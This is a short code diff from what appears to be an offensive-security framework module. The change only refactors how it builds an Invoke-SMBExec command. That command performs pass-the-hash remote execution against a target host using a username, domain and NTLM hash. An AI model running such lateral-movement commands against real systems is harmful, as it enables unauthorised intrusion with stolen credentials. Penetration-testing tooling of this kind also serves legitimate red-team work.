@@ -76,9 +76,7 @@ class Module:
         else:
             Cmd = "%COMSPEC% /C start /b " + command
 
-        script_end = "Invoke-SMBExec -Target {} -Username {} -Domain {} -Hash {} -Command '{}'".format(
-            computer_name, user_name, domain, ntlm_hash, Cmd
-        )
+        script_end = f"Invoke-SMBExec -Target {computer_name} -Username {user_name} -Domain {domain} -Hash {ntlm_hash} -Command '{Cmd}'"
         outputf = params.get("OutputFunction", "Out-String")
         script_end += (
             f" | {outputf} | "
